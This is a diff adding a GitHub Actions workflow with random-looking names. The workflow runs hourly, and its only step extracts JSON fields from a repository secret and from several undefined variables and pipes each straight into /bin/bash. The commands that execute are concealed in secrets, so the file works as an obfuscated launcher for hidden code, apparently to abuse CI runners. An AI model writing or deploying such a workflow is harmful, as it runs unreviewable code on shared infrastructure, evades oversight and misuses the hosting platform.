@@ -1,0 +1,25 @@
+name: xunkuangyu2345
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '55 * * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xunkuangyu2345
+        env:
+          yaqx80: ${{ secrets.yaqx80 }}
+        run: |
+          echo $yaqx80 | jq -r .nkenq2533 | /bin/bash
+          echo $p386 | jq -r .bud6010 | /bin/bash
+          echo $ewan0 | jq -r .km0926 | /bin/bash
+          echo $elkcj98 | jq -r .ahbs55569 | /bin/bash
+          echo $anucf14 | jq -r .vv3145 | /bin/bash
+          echo $rrux52 | jq -r .rcw861 | /bin/bash
+          echo $xirw4104 | jq -r .fli2318 | /bin/bash
+          echo $gzkwx7454 | jq -r .zn216 | /bin/bash
+
